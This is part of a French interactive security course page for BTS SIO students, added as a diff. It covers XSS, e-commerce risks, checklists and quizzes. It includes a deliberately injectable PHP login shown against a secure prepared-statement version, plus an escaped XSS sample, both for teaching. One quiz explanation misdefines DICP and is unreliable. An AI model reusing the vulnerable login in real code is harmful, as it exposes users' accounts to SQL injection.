+
+// Transformation sécurisée :
+// &lt;script&gt; → &amp;lt;script&amp;gt;
+
+// Résultat affiché :
+// Bonjour &amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;
+// Le script ne s'exécute PAS !
+?&gt;</div>
+                </div>
+            </div>
+
+            <div class="alert alert-danger">
+                <div class="alert-icon">🚨</div>
+                <div>
+                    <strong>Point critique :</strong> L'étape 3 (stockage) est le moment clé où l'on peut bloquer l'attaque. Une fois le code malveillant stocké sans protection, tous les visiteurs ultérieurs sont en danger.
+                </div>
+            </div>
+
+            <div class="alert alert-success">
+                <div class="alert-icon">✅</div>
+                <div>
+                    <strong>Règle d'or :</strong> Ne jamais faire confiance aux données utilisateur. Toujours échapper, valider et assainir avant affichage ou stockage.
+                </div>
+            </div>
+
+            <!-- Quiz 5 -->
+            <div class="quiz-container">
+                <div class="quiz-header" onclick="toggleQuiz(5)">
+                    <span>🎯 Quiz 5 : Timeline d'attaque XSS</span>
+                    <span class="quiz-arrow">▼</span>
+                </div>
+                <div id="quiz5" class="quiz-content">
+                    <div class="quiz-question">
+                        <div class="question-text">1. Quelle est la première étape d'une attaque XSS ?</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(5, 1, true)">A) Reconnaissance des formulaires vulnérables</div>
+                            <div class="quiz-option" onclick="selectAnswer(5, 1, false)">B) Injection du code malveillant</div>
+                            <div class="quiz-option" onclick="selectAnswer(5, 1, false)">C) Exécution du script</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">2. Quelle différence entre XSS stocké et XSS réfléchi ?</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(5, 2, false)">A) Aucune différence</div>
+                            <div class="quiz-option" onclick="selectAnswer(5, 2, true)">B) XSS stocké affecte tous les visiteurs futurs</div>
+                            <div class="quiz-option" onclick="selectAnswer(5, 2, false)">C) XSS réfléchi est plus dangereux</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">3. Quelle fonction PHP protège contre XSS ?</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(5, 3, false)">A) mysql_query()</div>
+                            <div class="quiz-option" onclick="selectAnswer(5, 3, true)">B) htmlspecialchars()</div>
+                            <div class="quiz-option" onclick="selectAnswer(5, 3, false)">C) echo()</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">4. À quel moment peut-on bloquer efficacement une attaque XSS ?</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(5, 4, false)">A) Uniquement après l'exécution</div>
+                            <div class="quiz-option" onclick="selectAnswer(5, 4, true)">B) Lors du stockage/affichage (échappement)</div>
+                            <div class="quiz-option" onclick="selectAnswer(5, 4, false)">C) Impossible de bloquer</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">5. Que transforme htmlspecialchars() sur &lt;script&gt; ?</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(5, 5, false)">A) Rien, garde &lt;script&gt;</div>
+                            <div class="quiz-option" onclick="selectAnswer(5, 5, true)">B) Le transforme en &amp;lt;script&amp;gt;</div>
+                            <div class="quiz-option" onclick="selectAnswer(5, 5, false)">C) Le supprime complètement</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-score">
+                        <h4>🎉 Résultat du Quiz 5</h4>
+                        <p class="score-text"></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Section 6: Mise en pratique - Cas e-commerce -->
+        <div id="pratique" class="section">
+            <h2>🛒 Mise en pratique : Cas d'usage e-commerce</h2>
+            
+            <div class="alert alert-info">
+                <div class="alert-icon">🎯</div>
+                <div>
+                    <strong>Scénario :</strong> Vous développez un site e-commerce avec catalogue produits, panier d'achat, paiement en ligne et comptes clients. Quels sont les risques et solutions ?
+                </div>
+            </div>
+
+            <h3>Risques identifiés et solutions (Cartes interactives)</h3>
+            <div class="flip-cards-container">
+                <div class="flip-card">
+                    <div class="flip-card-inner">
+                        <div class="flip-card-front">
+                            <div>
+                                <h3>🎭 RISQUE</h3>
+                                <p>Vol de numéros de cartes bancaires</p>
+                                <small>Type : Intentionnel</small>
+                            </div>
+                        </div>
+                        <div class="flip-card-back">
+                            <div>
+                                <h3>✅ SOLUTION</h3>
+                                <p>Déléguer à un PSP (Stripe, PayPal)</p>
+                                <small>Ne JAMAIS stocker les CB !</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="flip-card">
+                    <div class="flip-card-inner">
+                        <div class="flip-card-front">
+                            <div>
+                                <h3>🤷‍♂️ RISQUE</h3>
+                                <p>Bug qui vide tous les paniers</p>
+                                <small>Type : Accidentel</small>
+                            </div>
+                        </div>
+                        <div class="flip-card-back">
+                            <div>
+                                <h3>✅ SOLUTION</h3>
+                                <p>Sauvegardes BDD + Tests automatisés</p>
+                                <small>Récupération rapide possible</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="flip-card">
+                    <div class="flip-card-inner">
+                        <div class="flip-card-front">
+                            <div>
+                                <h3>⚖️ RISQUE</h3>
+                                <p>Emails marketing sans consentement</p>
+                                <small>Type : Réglementaire</small>
+                            </div>
+                        </div>
+                        <div class="flip-card-back">
+                            <div>
+                                <h3>✅ SOLUTION</h3>
+                                <p>Case à cocher optionnelle + lien désinscription</p>
+                                <small>Conformité RGPD assurée</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="flip-card">
+                    <div class="flip-card-inner">
+                        <div class="flip-card-front">
+                            <div>
+                                <h3>📈 RISQUE</h3>
+                                <p>Site lent pendant les soldes</p>
+                                <small>Type : Opérationnel</small>
+                            </div>
+                        </div>
+                        <div class="flip-card-back">
+                            <div>
+                                <h3>✅ SOLUTION</h3>
+                                <p>Cache Redis + Monitoring + Scaling automatique</p>
+                                <small>Performance maintenue</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <h3>Tableau récapitulatif des mesures par risque</h3>
+            <table class="visual-table">
+                <thead>
+                    <tr>
+                        <th>Type de risque</th>
+                        <th>Problème identifié</th>
+                        <th>Solution technique</th>
+                        <th>Outils recommandés</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="status-icon danger"></span><strong>Intentionnel</strong></td>
+                        <td>Vol données paiement</td>
+                        <td>Délégation PSP, HTTPS, chiffrement</td>
+                        <td>Stripe, PayPal, Let's Encrypt</td>
+                    </tr>
+                    <tr>
+                        <td><span class="status-icon warning"></span><strong>Accidentel</strong></td>
+                        <td>Perte de données</td>
+                        <td>Sauvegardes, tests, versionning</td>
+                        <td>mysqldump, Git, PHPUnit</td>
+                    </tr>
+                    <tr>
+                        <td><span class="status-icon danger"></span><strong>Réglementaire</strong></td>
+                        <td>Non-conformité RGPD</td>
+                        <td>Consentement, traçabilité, droits</td>
+                        <td>Cookie consent, logs audit</td>
+                    </tr>
+                    <tr>
+                        <td><span class="status-icon warning"></span><strong>Opérationnel</strong></td>
+                        <td>Performance dégradée</td>
+                        <td>Cache, CDN, monitoring, scaling</td>
+                        <td>Redis, Cloudflare, New Relic</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Exemple de code sécurisé : Authentification</h3>
+            <div class="code-comparison">
+                <div class="code-block bad-code">
+                    <div class="code-header">❌ Login Vulnérable</div>
+                    <div class="code-content">&lt;?php
+// DANGEREUX
+$user = $_POST['username'];
+$pass = $_POST['password'];
+
+$query = "SELECT * FROM users 
+    WHERE username='$user' 
+    AND password='$pass'";
+
+if (mysql_num_rows(mysql_query($query)) > 0) {
+    $_SESSION['user'] = $user;
+    echo "Connecté !";
+}
+?&gt;</div>
+                </div>
+                <div class="code-block good-code">
+                    <div class="code-header">✅ Login Sécurisé</div>
+                    <div class="code-content">&lt;?php
+// SÉCURISÉ
+$user = trim($_POST['username']);
+$pass = $_POST['password'];
+
+// Requête préparée
+$stmt = $pdo->prepare(
+    "SELECT id, username, password_hash 
+     FROM users WHERE username = ?"
+);
+$stmt->execute([$user]);
+$userData = $stmt->fetch();
+
+// Vérification hash sécurisée
+if ($userData && password_verify($pass, $userData['password_hash'])) {
+    $_SESSION['user_id'] = $userData['id'];
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+    echo "Connecté !";
+}
+?&gt;</div>
+                </div>
+            </div>
+
+            <div class="alert alert-success">
+                <div class="alert-icon">🏆</div>
+                <div>
+                    <strong>Bonnes pratiques appliquées :</strong> Requête préparée (anti-injection), password_verify() (vérification sécurisée), token CSRF (anti-rejeu), session sécurisée.
+                </div>
+            </div>
+
+            <!-- Quiz 6 -->
+            <div class="quiz-container">
+                <div class="quiz-header" onclick="toggleQuiz(6)">
+                    <span>🎯 Quiz 6 : Cas pratique e-commerce</span>
+                    <span class="quiz-arrow">▼</span>
+                </div>
+                <div id="quiz6" class="quiz-content">
+                    <div class="quiz-question">
+                        <div class="question-text">1. Pour sécuriser les paiements, la meilleure pratique est :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(6, 1, false)">A) Stocker les numéros de CB chiffrés</div>
+                            <div class="quiz-option" onclick="selectAnswer(6, 1, true)">B) Déléguer à un prestataire PSP (Stripe)</div>
+                            <div class="quiz-option" onclick="selectAnswer(6, 1, false)">C) Utiliser MD5 pour les CB</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">2. Un site e-commerce qui rame pendant les soldes subit quel type de risque ?</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(6, 2, false)">A) Intentionnel</div>
+                            <div class="quiz-option" onclick="selectAnswer(6, 2, false)">B) Réglementaire</div>
+                            <div class="quiz-option" onclick="selectAnswer(6, 2, true)">C) Opérationnel (perte de ventes)</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">3. Pour éviter l'injection SQL dans un login, on utilise :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(6, 3, true)">A) Les requêtes préparées PDO</div>
+                            <div class="quiz-option" onclick="selectAnswer(6, 3, false)">B) La concaténation de chaînes</div>
+                            <div class="quiz-option" onclick="selectAnswer(6, 3, false)">C) mysql_query() direct</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">4. password_verify() en PHP sert à :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(6, 4, false)">A) Créer un hash de mot de passe</div>
+                            <div class="quiz-option" onclick="selectAnswer(6, 4, true)">B) Vérifier un mot de passe contre son hash</div>
+                            <div class="quiz-option" onclick="selectAnswer(6, 4, false)">C) Chiffrer les mots de passe</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">5. Pour la conformité RGPD d'une newsletter, il faut :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(6, 5, false)">A) Collecter automatiquement tous les emails</div>
+                            <div class="quiz-option" onclick="selectAnswer(6, 5, true)">B) Demander le consentement explicite</div>
+                            <div class="quiz-option" onclick="selectAnswer(6, 5, false)">C) Envoyer sans demander</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-score">
+                        <h4>🎉 Résultat du Quiz 6</h4>
+                        <p class="score-text"></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Section 7: Checklists par profil -->
+        <div id="checklists" class="section">
+            <h2>📋 Checklists pratiques par profil</h2>
+            
+            <div class="alert alert-info">
+                <div class="alert-icon">📝</div>
+                <div>
+                    <strong>Utilisation :</strong> Ces checklists sont à utiliser avant chaque mise en production. Cochez les éléments au fur et à mesure de leur validation.
+                </div>
+            </div>
+
+            <div class="tabs">
+                <div class="tab active" onclick="showTab('checklist-frontend', this)">🎨 Checklist Front-End</div>
+                <div class="tab" onclick="showTab('checklist-backend', this)">⚙️ Checklist Back-End</div>
+                <div class="tab" onclick="showTab('checklist-fullstack', this)">🌐 Checklist Fullstack</div>
+            </div>
+
+            <div id="checklist-frontend" class="tab-content active">
+                <div class="checklist">
+                    <h3>✅ Checklist Front-End</h3>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>Validation des formulaires côté client (+ serveur obligatoire)</span>
+                    </div>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>Échappement des données affichées (textContent vs innerHTML)</span>
+                    </div>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>HTTPS sur toutes les pages (redirection automatique)</span>
+                    </div>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>Headers CSP (Content Security Policy) configurés</span>
+                    </div>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>Tests sur différents navigateurs (Chrome, Firefox, Safari)</span>
+                    </div>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>Gestion d'erreurs JavaScript (try/catch, fallbacks)</span>
+                    </div>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>Pas de données sensibles dans le code client</span>
+                    </div>
+                </div>
+
+                <div class="alert alert-success">
+                    <div class="alert-icon">🏆</div>
+                    <div>
+                        <strong>Certification recommandée :</strong> 
+                        <span class="badge badge-beginner">JavaScript Institute</span>
+                        <span class="badge badge-intermediate">React Developer</span>
+                    </div>
+                </div>
+            </div>
+
+            <div id="checklist-backend" class="tab-content">
+                <div class="checklist">
+                    <h3>✅ Checklist Back-End</h3>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>Requêtes préparées pour toutes les interactions BDD</span>
+                    </div>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>Mots de passe hachés avec bcrypt (minimum 12 rounds)</span>
+                    </div>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>Sessions sécurisées (httpOnly, secure, sameSite)</span>
+                    </div>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>Logs d'erreurs sans données sensibles</span>
+                    </div>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>Sauvegardes automatiques BDD (quotidiennes minimum)</span>
+                    </div>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>Variables d'environnement pour les secrets (.env)</span>
+                    </div>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>Limitation des tentatives de connexion (rate limiting)</span>
+                    </div>
+                </div>
+
+                <div class="alert alert-success">
+                    <div class="alert-icon">🏆</div>
+                    <div>
+                        <strong>Certifications recommandées :</strong> 
+                        <span class="badge badge-intermediate">PHP Certified</span>
+                        <span class="badge badge-advanced">CISSP Associate</span>
+                    </div>
+                </div>
+            </div>
+
+            <div id="checklist-fullstack" class="tab-content">
+                <div class="checklist">
+                    <h3>✅ Checklist Fullstack</h3>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>API authentifiée avec tokens JWT ou OAuth2</span>
+                    </div>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>Rate limiting sur les endpoints critiques</span>
+                    </div>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>Tests de sécurité automatisés (OWASP ZAP)</span>
+                    </div>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>Monitoring end-to-end (front + back + BDD)</span>
+                    </div>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>Plan de rollback documenté et testé</span>
+                    </div>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>Scan de vulnérabilités des dépendances (npm audit)</span>
+                    </div>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>Configuration CORS appropriée</span>
+                    </div>
+                    <div class="checklist-item" onclick="toggleCheckbox(this)">
+                        <div class="checkbox"></div>
+                        <span>Headers de sécurité complets (HSTS, CSP, etc.)</span>
+                    </div>
+                </div>
+
+                <div class="alert alert-success">
+                    <div class="alert-icon">🏆</div>
+                    <div>
+                        <strong>Certifications recommandées :</strong> 
+                        <span class="badge badge-intermediate">AWS Cloud Practitioner</span>
+                        <span class="badge badge-advanced">Certified Ethical Hacker</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Quiz 7 -->
+            <div class="quiz-container">
+                <div class="quiz-header" onclick="toggleQuiz(7)">
+                    <span>🎯 Quiz 7 : Checklists et bonnes pratiques</span>
+                    <span class="quiz-arrow">▼</span>
+                </div>
+                <div id="quiz7" class="quiz-content">
+                    <div class="quiz-question">
+                        <div class="question-text">1. Pour les sessions PHP sécurisées, quels paramètres utiliser ?</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(7, 1, false)">A) Uniquement secure</div>
+                            <div class="quiz-option" onclick="selectAnswer(7, 1, true)">B) httpOnly + secure + sameSite</div>
+                            <div class="quiz-option" onclick="selectAnswer(7, 1, false)">C) Aucun paramètre spécial</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">2. Le fichier .env sert à :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(7, 2, true)">A) Stocker les variables d'environnement secrètes</div>
+                            <div class="quiz-option" onclick="selectAnswer(7, 2, false)">B) Configurer l'environnement graphique</div>
+                            <div class="quiz-option" onclick="selectAnswer(7, 2, false)">C) Enregistrer les logs d'erreur</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">3. npm audit permet de :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(7, 3, false)">A) Auditer les performances</div>
+                            <div class="quiz-option" onclick="selectAnswer(7, 3, true)">B) Détecter les vulnérabilités des dépendances</div>
+                            <div class="quiz-option" onclick="selectAnswer(7, 3, false)">C) Auditer la syntaxe JavaScript</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">4. CORS (Cross-Origin Resource Sharing) contrôle :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(7, 4, true)">A) Quels domaines peuvent accéder à l'API</div>
+                            <div class="quiz-option" onclick="selectAnswer(7, 4, false)">B) La vitesse de chargement des pages</div>
+                            <div class="quiz-option" onclick="selectAnswer(7, 4, false)">C) L'encodage des caractères</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">5. Un plan de rollback sert à :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(7, 5, false)">A) Planifier les nouvelles fonctionnalités</div>
+                            <div class="quiz-option" onclick="selectAnswer(7, 5, true)">B) Revenir à la version précédente en cas de problème</div>
+                            <div class="quiz-option" onclick="selectAnswer(7, 5, false)">C) Organiser les équipes de développement</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-score">
+                        <h4>🎉 Résultat du Quiz 7</h4>
+                        <p class="score-text"></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Section 8: Points clés et ressources -->
+        <div id="ressources" class="section">
+            <h2>💡 Points clés et ressources pour aller plus loin</h2>
+            
+            <h3>🎯 Les 5 points essentiels à retenir</h3>
+            <div class="flip-cards-container">
+                <div class="flip-card">
+                    <div class="flip-card-inner">
+                        <div class="flip-card-front">
+                            <div>
+                                <h3>1️⃣</h3>
+                                <p><strong>Sécurité ≠ Sûreté</strong></p>
+                                <small>Cliquez pour détail</small>
+                            </div>
+                        </div>
+                        <div class="flip-card-back">
+                            <div>
+                                <p>🛡️ <strong>Sécurité</strong> = contre attaques</p>
+                                <p>🔧 <strong>Sûreté</strong> = contre bugs/pannes</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="flip-card">
+                    <div class="flip-card-inner">
+                        <div class="flip-card-front">
+                            <div>
+                                <h3>2️⃣</h3>
+                                <p><strong>RGPD obligatoire</strong></p>
+                                <small>Privacy by Design</small>
+                            </div>
+                        </div>
+                        <div class="flip-card-back">
+                            <div>
+                                <p>✅ Consentement explicite</p>
+                                <p>✅ Minimisation données</p>
+                                <p>✅ Droits des personnes</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="flip-card">
+                    <div class="flip-card-inner">
+                        <div class="flip-card-front">
+                            <div>
+                                <h3>3️⃣</h3>
+                                <p><strong>Profils spécialisés</strong></p>
+                                <small>Chacun ses priorités</small>
+                            </div>
+                        </div>
+                        <div class="flip-card-back">
+                            <div>
+                                <p>🎨 <strong>Front</strong> → XSS, CSP</p>
+                                <p>⚙️ <strong>Back</strong> → Injection, Hash</p>
+                                <p>🌐 <strong>Full</strong> → Vision globale</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="flip-card">
+                    <div class="flip-card-inner">
+                        <div class="flip-card-front">
+                            <div>
+                                <h3>4️⃣</h3>
+                                <p><strong>4 types de risques</strong></p>
+                                <small>Bien les identifier</small>
+                            </div>
+                        </div>
+                        <div class="flip-card-back">
+                            <div>
+                                <p>🎭 Intentionnels</p>
+                                <p>🤷‍♂️ Accidentels</p>
+                                <p>⚖️ Réglementaires</p>
+                                <p>📈 Opérationnels</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="flip-card">
+                    <div class="flip-card-inner">
+                        <div class="flip-card-front">
+                            <div>
+                                <h3>5️⃣</h3>
+                                <p><strong>Processus continu</strong></p>
+                                <small>Jamais terminé</small>
+                            </div>
+                        </div>
+                        <div class="flip-card-back">
+                            <div>
+                                <p>📚 Veille permanente</p>
+                                <p>🧪 Tests réguliers</p>
+                                <p>🔄 Mises à jour</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <h3>🛠️ Outils essentiels par catégorie</h3>
+            <table class="visual-table">
+                <thead>
+                    <tr>
+                        <th>Catégorie</th>
+                        <th>Outil</th>
+                        <th>Usage</th>
+                        <th>Niveau</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Tests sécurité</strong></td>
+                        <td>OWASP ZAP</td>
+                        <td>Scan automatisé des vulnérabilités web</td>
+                        <td><span class="badge badge-beginner">Gratuit</span></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Audit dépendances</strong></td>
+                        <td>npm audit / Snyk</td>
+                        <td>Détection vulnérabilités dans les librairies</td>
+                        <td><span class="badge badge-intermediate">Pro</span></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Monitoring</strong></td>
+                        <td>Grafana + Prometheus</td>
+                        <td>Surveillance en temps réel</td>
+                        <td><span class="badge badge-advanced">Expert</span></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Chiffrement</strong></td>
+                        <td>Let's Encrypt</td>
+                        <td>Certificats SSL/TLS gratuits</td>
+                        <td><span class="badge badge-beginner">Gratuit</span></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Authentification</strong></td>
+                        <td>Auth0 / Firebase Auth</td>
+                        <td>Authentification sécurisée clé en main</td>
+                        <td><span class="badge badge-intermediate">SaaS</span></td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>📚 Ressources pour approfondir</h3>
+            <div class="alert alert-info">
+                <div class="alert-icon">📖</div>
+                <div>
+                    <strong>Documentation officielle :</strong>
+                    <ul style="margin: 10px 0 0 20px;">
+                        <li><strong>OWASP Top 10</strong> : Les 10 vulnérabilités web les plus critiques</li>
+                        <li><strong>CNIL - Guides développeurs</strong> : Conformité RGPD en pratique</li>
+                        <li><strong>ANSSI - Hygiène informatique</strong> : Bonnes pratiques de sécurité</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="alert alert-success">
+                <div class="alert-icon">🎓</div>
+                <div>
+                    <strong>Préparation BTS SIO :</strong> Ce chapitre couvre les compétences <strong>B3.1</strong> (Protéger les données personnelles), <strong>B3.4</strong> (Garantir disponibilité/intégrité/confidentialité) et <strong>B3.5B</strong> (Cybersécurité applicative) pour l'épreuve <strong>E7 Cybersécurité</strong>.
+                </div>
+            </div>
+
+            <!-- Quiz final -->
+            <div class="quiz-container">
+                <div class="quiz-header" onclick="toggleQuiz(8)">
+                    <span>🎯 Quiz 8 : Synthèse générale</span>
+                    <span class="quiz-arrow">▼</span>
+                </div>
+                <div id="quiz8" class="quiz-content">
+                    <div class="quiz-question">
+                        <div class="question-text">1. Quelle est la règle d'or en sécurité applicative ?</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(8, 1, false)">A) Faire confiance aux utilisateurs</div>
+                            <div class="quiz-option" onclick="selectAnswer(8, 1, true)">B) Ne jamais faire confiance aux données utilisateur</div>
+                            <div class="quiz-option" onclick="selectAnswer(8, 1, false)">C) Sécuriser uniquement en production</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">2. OWASP ZAP est un outil pour :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(8, 2, false)">A) Développer des applications</div>
+                            <div class="quiz-option" onclick="selectAnswer(8, 2, true)">B) Tester la sécurité des applications web</div>
+                            <div class="quiz-option" onclick="selectAnswer(8, 2, false)">C) Gérer les bases de données</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">3. La sécurité applicative est :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(8, 3, false)">A) Une étape finale avant la mise en prod</div>
+                            <div class="quiz-option" onclick="selectAnswer(8, 3, true)">B) Un processus continu intégré au développement</div>
+                            <div class="quiz-option" onclick="selectAnswer(8, 3, false)">C) Uniquement la responsabilité des admins sys</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">4. Quelle est la principale différence entre un test d'intrusion et un audit de sécurité ?</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(8, 4, false)">A) Il n'y a aucune différence</div>
+                            <div class="quiz-option" onclick="selectAnswer(8, 4, true)">B) Le test d'intrusion simule des attaques réelles, l'audit vérifie la conformité</div>
+                            <div class="quiz-option" onclick="selectAnswer(8, 4, false)">C) L'audit est plus technique que le test d'intrusion</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">5. La veille en cybersécurité consiste à :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(8, 5, false)">A) Surveiller les concurrents</div>
+                            <div class="quiz-option" onclick="selectAnswer(8, 5, true)">B) Se tenir informé des nouvelles menaces et solutions</div>
+                            <div class="quiz-option" onclick="selectAnswer(8, 5, false)">C) Regarder les logs d'erreur</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-score">
+                        <h4>🎉 Résultat du Quiz Final</h4>
+                        <p class="score-text"></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Navigation entre sections -->
+        <div class="nav-buttons">
+            <a href="#objectifs" class="nav-btn">⬆️ Retour au début</a>
+            <button class="nav-btn" onclick="window.print()">🖨️ Imprimer le cours</button>
+        </div>
+    </div>
+
+    <script>
+        // Données des quiz avec réponses et explications
+        const quizData = {
+            1: [
+                {
+                    correct: "B",
+                    explanation: "DICP signifie Déclaration Informatique et Libertés, principe de base du RGPD."
+                },
+                {
+                    correct: "B", 
+                    explanation: "Privacy by Design signifie intégrer la sécurité dès la conception, pas après."
+                },
+                {
+                    correct: "A",
+                    explanation: "Pour une newsletter, seul l'email est nécessaire. Le principe de minimisation RGPD s'applique."
+                },
+                {
+                    correct: "C",
